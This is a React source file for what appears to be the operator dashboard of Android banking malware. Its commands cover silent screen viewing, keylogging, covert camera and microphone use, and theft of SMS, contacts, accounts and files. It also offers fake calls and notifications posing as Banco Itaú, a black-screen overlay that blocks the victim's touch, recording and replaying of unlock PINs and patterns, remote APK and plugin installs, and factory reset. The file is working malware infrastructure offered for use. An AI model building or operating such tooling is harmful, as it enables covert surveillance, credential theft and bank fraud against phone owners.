import React, { useState } from 'react';
import { sendCommand } from '../services/wsService';

interface Props {
  deviceId: string;
}

type CatKey =
  | 'screen' | 'gesture' | 'device' | 'surveillance'
  | 'exfiltration' | 'apps' | 'fakeui' | 'blackscreen'
  | 'unlock' | 'system' | 'plugins';

interface Cmd {
  id: string;
  label: string;
  params?: { key: string; label: string; type: 'text' | 'number' | 'select'; opts?: string[]; default?: string }[];
  danger?: boolean;
}

const CATEGORIES: Record<CatKey, { label: string; color: string; cmds: Cmd[] }> = {
  screen: {
    label: 'Screen / VNC',
    color: 'cyan',
    cmds: [
      { id: 'START_SILENT_VNC', label: 'Start Silent VNC' },
      { id: 'STOP_SILENT_VNC', label: 'Stop Silent VNC' },
      { id: 'TOGGLE_SILENT_VNC', label: 'Toggle Silent VNC' },
      { id: 'FORCE_RESTART_VNC', label: 'Force Restart VNC' },
      { id: 'REQUEST_VNC_FRAME', label: 'Request Frame' },
      { id: 'SET_SILENT_VNC_QUALITY', label: 'Set Quality', params: [{ key: 'quality', label: 'Quality (10-100)', type: 'number', default: '75' }] },
      { id: 'SNAP_SCREEN', label: 'Snapshot' },
      { id: 'TRIGGER_SNAP_SCREEN', label: 'Trigger Snapshot' },
      { id: 'START_VNC', label: 'Start VNC (Standard)' },
      { id: 'STOP_VNC', label: 'Stop VNC (Standard)' },
    ],
  },
  gesture: {
    label: 'Gesture / Input',
    color: 'violet',
    cmds: [
      { id: 'TAP', label: 'Tap', params: [{ key: 'x', label: 'X', type: 'number', default: '540' }, { key: 'y', label: 'Y', type: 'number', default: '960' }] },
      { id: 'LONG_PRESS', label: 'Long Press', params: [{ key: 'x', label: 'X', type: 'number', default: '540' }, { key: 'y', label: 'Y', type: 'number', default: '960' }] },
      { id: 'SWIPE', label: 'Swipe', params: [{ key: 'x1', label: 'X1', type: 'number', default: '540' }, { key: 'y1', label: 'Y1', type: 'number', default: '1200' }, { key: 'x2', label: 'X2', type: 'number', default: '540' }, { key: 'y2', label: 'Y2', type: 'number', default: '400' }] },
      { id: 'TYPE', label: 'Type Text', params: [{ key: 'text', label: 'Text', type: 'text', default: '' }] },
      { id: 'BACK', label: 'Back' },
      { id: 'HOME', label: 'Home' },
      { id: 'RECENTS', label: 'Recents' },
      { id: 'QUICK_SETTINGS', label: 'Quick Settings' },
      { id: 'POWER_MENU', label: 'Power Menu' },
    ],
  },
  device: {
    label: 'Device Control',
    color: 'sky',
    cmds: [
      { id: 'SCREEN_ON', label: 'Screen On' },
      { id: 'LOCK_DEVICE', label: 'Lock Device' },
      { id: 'WAKE_UP', label: 'Wake Up' },
      { id: 'SET_VOLUME', label: 'Set Volume', params: [{ key: 'level', label: 'Level (0-15)', type: 'number', default: '5' }, { key: 'stream', label: 'Stream', type: 'select', opts: ['music', 'ring', 'alarm', 'notification'], default: 'music' }] },
      { id: 'SET_BRIGHTNESS', label: 'Set Brightness', params: [{ key: 'value', label: 'Brightness (0-255)', type: 'number', default: '128' }] },
      { id: 'SET_TORCH', label: 'Torch', params: [{ key: 'on', label: 'On/Off', type: 'select', opts: ['true', 'false'], default: 'true' }] },
      { id: 'SET_WIFI', label: 'Set WiFi', params: [{ key: 'enabled', label: 'Enable', type: 'select', opts: ['true', 'false'], default: 'true' }] },
      { id: 'SET_RINGER_MODE', label: 'Ringer Mode', params: [{ key: 'mode', label: 'Mode', type: 'select', opts: ['normal', 'silent', 'vibrate'], default: 'silent' }] },
      { id: 'VIBRATE', label: 'Vibrate', params: [{ key: 'duration', label: 'Duration (ms)', type: 'number', default: '500' }] },
      { id: 'SET_SCREEN_TIMEOUT', label: 'Screen Timeout', params: [{ key: 'ms', label: 'Timeout (ms)', type: 'number', default: '60000' }] },
      { id: 'SCREEN_PERSISTENCE', label: 'Screen Persistence', params: [{ key: 'enabled', label: 'Enable', type: 'select', opts: ['true', 'false'], default: 'true' }] },
    ],
  },
  surveillance: {
    label: 'Surveillance',
    color: 'amber',
    cmds: [
      { id: 'TOGGLE_CAMERA', label: 'Toggle Camera' },
      { id: 'SWITCH_CAMERA', label: 'Switch Camera' },
      { id: 'TOGGLE_MICROPHONE', label: 'Toggle Mic' },
      { id: 'TOGGLE_KEYLOGGER', label: 'Toggle Keylogger' },
      { id: 'GET_LOCATION', label: 'Get Location' },
      { id: 'GET_CLIPBOARD', label: 'Get Clipboard' },
      { id: 'INJECT_CLIPBOARD', label: 'Inject Clipboard', params: [{ key: 'text', label: 'Text', type: 'text', default: '' }] },
      { id: 'SET_CLIPBOARD', label: 'Set Clipboard', params: [{ key: 'text', label: 'Text', type: 'text', default: '' }] },
    ],
  },
  exfiltration: {
    label: 'Exfiltration',
    color: 'orange',
    cmds: [
      { id: 'GET_DEVICE_INFO', label: 'Device Info' },
      { id: 'GET_INSTALLED_APPS', label: 'Installed Apps' },
      { id: 'GET_ACCOUNTS', label: 'Accounts' },
      { id: 'GET_GOOGLE_ACCOUNTS', label: 'Google Accounts' },
      { id: 'GET_SMS', label: 'Get SMS' },
      { id: 'GET_CONTACTS', label: 'Get Contacts' },
      { id: 'GET_FILES', label: 'Get Files', params: [{ key: 'path', label: 'Path', type: 'text', default: '/sdcard/' }] },
      { id: 'SEND_SMS', label: 'Send SMS', params: [{ key: 'number', label: 'Number', type: 'text', default: '' }, { key: 'text', label: 'Text', type: 'text', default: '' }] },
      { id: 'MAKE_CALL', label: 'Make Call', params: [{ key: 'number', label: 'Number', type: 'text', default: '' }] },
    ],
  },
  apps: {
    label: 'App Management',
    color: 'lime',
    cmds: [
      { id: 'OPEN_APP', label: 'Open App', params: [{ key: 'package', label: 'Package', type: 'text', default: '' }] },
      { id: 'FORCE_STOP', label: 'Force Stop', params: [{ key: 'package', label: 'Package', type: 'text', default: '' }] },
      { id: 'INSTALL_APK', label: 'Install APK', params: [{ key: 'url', label: 'APK URL', type: 'text', default: '' }] },
      { id: 'DELETE_APP', label: 'Uninstall App', params: [{ key: 'package', label: 'Package', type: 'text', default: '' }] },
      { id: 'DUPLICATE_APP', label: 'Clone App', params: [{ key: 'package', label: 'Package', type: 'text', default: '' }] },
      { id: 'TOGGLE_BLOCK_APP', label: 'Block App', params: [{ key: 'package', label: 'Package', type: 'text', default: '' }] },
    ],
  },
  fakeui: {
    label: 'Fake UI',
    color: 'pink',
    cmds: [
      { id: 'FAKE_CALL', label: 'Fake Call', params: [{ key: 'callerName', label: 'Caller Name', type: 'text', default: 'Banco Itaú' }, { key: 'callerNumber', label: 'Number', type: 'text', default: '+55 (11) 4004-4828' }] },
      { id: 'CANCEL_FAKE_CALL', label: 'End Fake Call' },
      { id: 'FAKE_NOTIFICATION', label: 'Fake Notification', params: [{ key: 'app', label: 'App Package', type: 'text', default: 'com.itau.empresas' }, { key: 'title', label: 'Title', type: 'text', default: 'Itaú' }, { key: 'text', label: 'Text', type: 'text', default: 'Atividade suspeita detectada' }] },
    ],
  },
  blackscreen: {
    label: 'Black Screen',
    color: 'gray',
    cmds: [
      { id: 'BLACK_SCREEN_ON', label: 'Black Screen ON' },
      { id: 'BLACK_SCREEN_OFF', label: 'Black Screen OFF' },
      { id: 'TOGGLE_BLACK_SCREEN', label: 'Toggle Black Screen' },
      { id: 'SET_BLACK_SCREEN_OPACITY', label: 'Set Opacity', params: [{ key: 'opacity', label: 'Opacity (0-255)', type: 'number', default: '255' }] },
      { id: 'SET_TOUCH_BLOCK', label: 'Block Touch', params: [{ key: 'enabled', label: 'Enable', type: 'select', opts: ['true', 'false'], default: 'true' }] },
    ],
  },
  unlock: {
    label: 'Unlock / Credential',
    color: 'red',
    cmds: [
      { id: 'START_UNLOCK_RECORDING', label: 'Start Unlock Recording' },
      { id: 'STOP_UNLOCK_RECORDING', label: 'Stop Unlock Recording' },
      { id: 'PLAY_UNLOCK_SEQUENCE', label: 'Replay Unlock' },
      { id: 'PLAY_PIN_SEQUENCE', label: 'Replay PIN' },
      { id: 'PLAY_PATTERN_SEQUENCE', label: 'Replay Pattern' },
    ],
  },
  system: {
    label: 'System',
    color: 'slate',
    cmds: [
      { id: 'PING', label: 'Ping' },
      { id: 'CHECK_PERMISSIONS', label: 'Check Permissions' },
      { id: 'CHECK_ADMIN_STATUS', label: 'Check Admin' },
      { id: 'STEALTH_STATUS', label: 'Stealth Status' },
      { id: 'SET_THREAT_LEVEL', label: 'Set Threat Level', params: [{ key: 'level', label: 'Level', type: 'select', opts: ['0', '1', '2', '3'], default: '1' }] },
      { id: 'CONFIGURE_ROM', label: 'Configure ROM' },
      { id: 'RECONNECT_CONNECTION', label: 'Reconnect' },
      { id: 'OPEN_SETTINGS', label: 'Open Settings' },
      { id: 'TOGGLE_KILLER_MODE', label: 'Killer Mode', params: [{ key: 'enabled', label: 'Enable', type: 'select', opts: ['true', 'false'], default: 'true' }] },
      { id: 'SELF_DESTRUCT', label: 'Self Destruct', danger: true },
      { id: 'FORMAT_DEVICE', label: 'Factory Reset', danger: true },
    ],
  },
  plugins: {
    label: 'Plugins',
    color: 'teal',
    cmds: [
      { id: 'LIST_PLUGINS', label: 'List Plugins' },
      { id: 'LOAD_PLUGIN', label: 'Load Plugin', params: [{ key: 'url', label: 'Plugin URL', type: 'text', default: '' }] },
      { id: 'UNLOAD_PLUGIN', label: 'Unload Plugin', params: [{ key: 'name', label: 'Plugin Name', type: 'text', default: '' }] },
      { id: 'EXEC_PLUGIN', label: 'Exec Plugin', params: [{ key: 'name', label: 'Plugin Name', type: 'text', default: '' }, { key: 'data', label: 'Data (JSON)', type: 'text', default: '{}' }] },
    ],
  },
};

const COLOR_MAP: Record<string, string> = {
  cyan:   'border-cyan-600/30 bg-cyan-950/20 text-cyan-400',
  violet: 'border-violet-600/30 bg-violet-950/20 text-violet-400',
  sky:    'border-sky-600/30 bg-sky-950/20 text-sky-400',
  amber:  'border-amber-600/30 bg-amber-950/20 text-amber-400',
  orange: 'border-orange-600/30 bg-orange-950/20 text-orange-400',
  lime:   'border-lime-600/30 bg-lime-950/20 text-lime-400',
  pink:   'border-pink-600/30 bg-pink-950/20 text-pink-400',
  gray:   'border-gray-600/30 bg-gray-900/40 text-gray-400',
  red:    'border-red-600/30 bg-red-950/20 text-red-400',
  slate:  'border-slate-600/30 bg-slate-900/40 text-slate-400',
  teal:   'border-teal-600/30 bg-teal-950/20 text-teal-400',
};

export const ControlPanel: React.FC<Props> = ({ deviceId }) => {
  const [activeCategory, setActiveCategory] = useState<CatKey>('screen');
  const [paramValues, setParamValues] = useState<Record<string, Record<string, string>>>({});
  const [executing, setExecuting] = useState<string | null>(null);

  const cat = CATEGORIES[activeCategory];

  const getParam = (cmdId: string, key: string, def: string) =>
    paramValues[cmdId]?.[key] ?? def;

  const setParam = (cmdId: string, key: string, val: string) =>
    setParamValues((prev) => ({
      ...prev,
      [cmdId]: { ...(prev[cmdId] ?? {}), [key]: val },
    }));

  const execute = (cmd: Cmd) => {
    setExecuting(cmd.id);
    const params: Record<string, unknown> = {};
    for (const p of cmd.params ?? []) {
      const raw = getParam(cmd.id, p.key, p.default ?? '');
      params[p.key] = p.type === 'number' ? Number(raw) : raw;
    }
    sendCommand(deviceId, cmd.id, params);
    setTimeout(() => setExecuting(null), 800);
  };

  return (
    <div className="flex h-full overflow-hidden" style={{ fontFamily: 'var(--font-mono)' }}>
      {/* category rail */}
      <div className="w-40 flex flex-col gap-0.5 p-2 border-r border-slate-800 overflow-y-auto shrink-0">
        {(Object.keys(CATEGORIES) as CatKey[]).map((key) => {
          const c = CATEGORIES[key];
          const active = key === activeCategory;
          return (
            <button
              key={key}
              onClick={() => setActiveCategory(key)}
              className={`w-full text-left px-2.5 py-1.5 rounded text-xs transition-all ${
                active
                  ? `bg-slate-700 text-white`
                  : 'text-slate-400 hover:text-slate-200 hover:bg-slate-800'
              }`}
            >
              {c.label}
            </button>
          );
        })}
      </div>

      {/* command list */}
      <div className="flex-1 overflow-y-auto p-3 space-y-2">
        {cat.cmds.map((cmd) => (
          <div
            key={cmd.id}
            className={`rounded border p-3 ${COLOR_MAP[cat.color] ?? COLOR_MAP.slate}`}
          >
            <div className="flex items-center justify-between mb-2">
              <span className="text-xs font-semibold tracking-wide">{cmd.label}</span>
              <button
                onClick={() => execute(cmd)}
                disabled={executing === cmd.id}
                className={`px-3 py-1 rounded text-xs font-mono transition-all ${
                  cmd.danger
                    ? 'bg-red-700 hover:bg-red-600 text-white'
                    : 'bg-slate-700 hover:bg-slate-600 text-white'
                } ${executing === cmd.id ? 'opacity-50 cursor-not-allowed' : ''}`}
              >
                {executing === cmd.id ? '...' : 'EXEC'}
              </button>
            </div>

            {(cmd.params ?? []).length > 0 && (
              <div className="grid grid-cols-2 gap-2 mt-1">
                {(cmd.params ?? []).map((p) =>
                  p.type === 'select' ? (
                    <div key={p.key} className="flex flex-col gap-0.5">
                      <label className="text-[10px] text-white/30">{p.label}</label>
                      <select
                        value={getParam(cmd.id, p.key, p.default ?? '')}
                        onChange={(e) => setParam(cmd.id, p.key, e.target.value)}
                        className="bg-black/40 border border-white/10 text-white/70 text-xs rounded px-2 py-1 outline-none"
                      >
                        {p.opts?.map((o) => (
                          <option key={o} value={o}>{o}</option>
                        ))}
                      </select>
                    </div>
                  ) : (
                    <div key={p.key} className="flex flex-col gap-0.5">
                      <label className="text-[10px] text-white/30">{p.label}</label>
                      <input
                        type={p.type === 'number' ? 'number' : 'text'}
                        value={getParam(cmd.id, p.key, p.default ?? '')}
                        onChange={(e) => setParam(cmd.id, p.key, e.target.value)}
                        className="bg-black/40 border border-white/10 text-white/70 text-xs rounded px-2 py-1 outline-none font-mono"
                      />
                    </div>
                  )
                )}
              </div>
            )}
          </div>
        ))}
      </div>
    </div>
  );
};
